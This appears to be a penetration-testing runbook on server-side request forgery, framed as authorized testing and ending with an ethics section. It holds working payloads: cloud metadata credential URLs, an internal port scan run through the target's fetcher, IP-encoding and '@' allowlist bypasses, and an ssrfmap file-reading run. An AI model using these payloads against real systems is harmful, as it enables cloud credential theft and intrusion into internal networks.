---
title: "Server-Side Request Forgery (SSRF)"
description: "Making the server fetch on your behalf: internal service discovery, cloud metadata access, blind SSRF detection, and bypassing URL allowlists."
phase: Web
order: 2
tags:
  - ssrf
  - cloud
  - metadata
  - owasp
tools:
  - interactsh
  - ssrfmap
  - curl
  - ffuf
updated: 2026-10-01
---

A runbook for authorized SSRF testing on **in-scope** targets. Goal: confirm the server fetches attacker-controlled URLs, reach internal services or cloud metadata, and prove impact with redacted evidence.

## 1. Start an out-of-band listener

Every test needs a callback channel to detect blind fetches.

```bash
# Live interactsh client; note the generated domain
interactsh-client -v
# => https://xxxxx.oast.fun
```

Embed an identifier in the path so you know which parameter triggered the request.

## 2. Find URL-consuming features

Catalogue every place the app fetches a URL server-side:

- Webhooks, avatar/image fetchers, PDF/screenshot generators, URL preview/unfurling.
- Import-by-URL, RSS readers, "fetch from link".
- XML parsers (XXE -> SSRF) and any server-side redirect follower.

## 3. Confirm blind SSRF

Inject your callback URL into each candidate parameter.

```bash
curl -s "https://target/api/fetch?url=https://xxxxx.oast.fun/ssrf-param1"
# interactsh-client shows an inbound DNS/HTTP hit => the server fetched it
```

## 4. Reach internal targets

Once the fetch is confirmed, swap the callback for internal addresses.

```bash
# Localhost services
curl -s "https://target/api/fetch?url=http://127.0.0.1:8080/"
curl -s "https://target/api/fetch?url=http://[::1]:22/"

# Cloud metadata
curl -s "https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://target/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
```

Probe common ports through the fetcher with ffuf to map what is reachable:

```bash
seq 1 10000 | ffuf -u "https://target/api/fetch?url=http://127.0.0.1:FUZZ/" \
  -mc 200 -fs 0 -w - -s -t 20
```

## 5. Bypass allowlists

Defeat naive validation with alternate representations:

- Decimal/octal/hex IP: `2130706433`, `0177.0.0.1`, `0x7f.1`.
- IPv6-mapped IPv4: `::ffff:127.0.0.1`.
- DNS rebinding, and allowed URLs that 302 to internal ones.
- Parser quirks: `http://allowed.com@127.0.0.1/`, backslashes, fragments.

```bash
curl -s "https://target/api/fetch?url=http://2130706433:80/"
curl -s "https://target/api/fetch?url=http://allowed.com@169.254.169.254/"
```

Automate parameter discovery with ssrfmap after you have a request captured from Burp.

## 6. Prove impact safely

- Show a metadata response or an internal banner the app should not reach.
- Redact credential values; keep the response shape as evidence.
- Do not use any retrieved credential against real services — report it instead.

## Full pipeline

```bash
# 1. Callback listener
interactsh-client -v   # copy the oast domain

# 2. Confirm blind fetch
curl -s "https://target/api/fetch?url=https://YOUR.oast.fun/ssrf-1"

# 3. Probe internal ports
seq 1 10000 | ffuf -u "https://target/api/fetch?url=http://127.0.0.1:FUZZ/" \
  -mc 200 -fs 0 -w - -s -t 20

# 4. Try metadata and allowlist bypasses
curl -s "https://target/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target/api/fetch?url=http://2130706433:80/"

# 5. Feed a captured request to ssrfmap for wider coverage
ssrfmap -r req.txt -p url -m readfiles,portscan
```

## Ethics & legality

- Only test targets within an authorized scope.
- Never pivot through retrieved cloud credentials or attack third-party services.
- Keep callback logs, redact secrets, and report the exact fetch chain as evidence.
